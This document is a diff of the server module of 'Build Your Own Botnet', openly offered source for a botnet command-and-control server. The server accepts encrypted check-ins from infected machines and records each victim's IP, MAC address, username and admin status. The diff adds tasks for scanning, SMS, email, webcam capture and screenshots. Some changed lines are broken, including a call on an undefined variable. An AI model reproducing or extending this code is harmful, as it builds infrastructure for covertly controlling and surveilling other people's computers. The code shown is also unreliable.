@@ -3,8 +3,20 @@
 Build Your Own Botnet
 github.com/colental/byob
 Copyright (c) 2018 Daniel Vega-Myhre
+
+88                                  88
+88                                  88
+88                                  88
+88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
+88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
+88       d8  `8b   d8'  8b       d8 88       d8
+88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
+8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
+                d8'
+               d8'
+
+
 """
-# import Python packages
 from __future__ import print_function
 import os
 import sys
@@ -17,11 +29,11 @@ import pickle
 import socket
 import struct
 import base64
-import argparse
 import random
 import logging
 import requests
 import colorama
+import argparse
 import datetime
 import functools
 import cStringIO
@@ -34,10 +46,8 @@ import Crypto.Util
 import Crypto.Cipher.AES
 import Crypto.PublicKey.RSA
 import Crypto.Cipher.PKCS1_OAEP
-# import BYOB database, utilities
-from . import util
-from . import database
-
+from database import *
+from util import *
 
 
 
@@ -51,30 +61,15 @@ class HandlerError(Exception):
 
 class Server(threading.Thread):
 
-    """
-
-        88                                  88
-        88                                  88
-        88                                  88
-        88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
-        88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
-        88       d8  `8b   d8'  8b       d8 88       d8
-        88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
-        8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
-                        d8'
-                       d8'
-
-    """
-
     def __init__(self, port=1337, debug=True, **kwargs):
         """
-        BYOB Server: Server
+        Server (Build Your Own Botnet)
         """
         super(Server, self).__init__()
         self.clients            = {}
         self.current_client     = None
-        self.database           = self._get_database()
         self.config             = self._get_config()
+        self.database           = self._get_database()
         self.commands           = self._get_commands()
         self._socket            = self._get_socket()
         self._text_color        = self._get_color()
@@ -190,12 +185,14 @@ class Server(threading.Thread):
 
     def _get_database(self, port):
         try:
-            print(getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','WHITE','MAGENTA'])) + colorama.Style.BRIGHT + self.__doc__ + colorama.Fore.WHITE + colorama.Style.DIM + '\n{:>40}\n{:>25}\n'.format('Build Your Own Botnet','v0.1.1'))
+            print(getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','WHITE','MAGENTA'])) + colorama.Style.BRIGHT + __doc__ + colorama.Fore.WHITE + colorama.Style.DIM + '\n{:>40}\n{:>25}\n'.format('Build Your Own Botnet','v0.1.1'))
             print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + " [?] " + colorama.Fore.RESET + colorama.Style.DIM + "Hint: show usage information with the 'help' command\n")
             db = None
             if self.config.has_section('database'):
                 try:
                     db = Database(**self.config['database'])
+                    d.set_tasks(['scan','sms','email','webcam','screenshot'])
+                    d.execute_file('../resources/build_database.sql')
                     print(colorama.Fore.CYAN + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + colorama.Style.DIM + "Connected to database")
                 except:
                     max_v = max(map(len, self.config['database'].values())) + 2
@@ -668,20 +665,7 @@ class Handler(threading.Thread):
             buf += self._connection.recv(1024)
         text  = server._decrypt(buf.rstrip(), self.session_key)
         data  = json.loads(text.rstrip())
-        if data.get('id'):
-            client = data.get('id')
-            select = server.database_query("select * from tbl_clients where id='{}'".format(client), display=False)
-            if select:
-                print("\n\n" + colorama.Fore.GREEN  + colorama.Style.DIM + " [+] " + colorama.Fore.RESET + "Client {} has reconnected\n".format(self._name))
-                _ = server.database_query('UPDATE tbl_clients SET %s' % ("{}='{}'".format(attr,data[attr]) for attr in ['id','public_ip','local_ip',  'mac_address', 'username', 'administrator', 'device', 'platform', 'architecture']), display=False)
-            else:
-                print("\n\n" + colorama.Fore.GREEN  + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + "New connection - Client {}: \n".format(self._name))
-                server.display(json.dumps(data))
-                values = map(data.get, ['id', 'public_ip', 'local_ip', 'mac_address', 'username', 'administrator', 'device', 'platform', 'architecture'])
-                try:
-                    server.database_procedure('sp_addClient', values)
-                except mysql.connector.InterfaceError:
-                    pass
+        self.database.handle_client(data)
         return data
 
 
@@ -778,7 +762,7 @@ def main():
     parser.add_argument('--debug', action='store_true', default=False, help='enable debugging mode')
     try:
         options = parser.parse_args()
-        byob_server  = Server(port=options.port, debug=options.debug)
+        byob_server  = Server(port=options.port, config='../config.ini', debug=options.debug)
         byob_server.start()
     except Exception as e:
         print("\n" + colorama.Fore.RED + colorama.Style.NORMAL + "[-] " + colorama.Fore.RESET + "Error: %s" % str(e) + "\n")
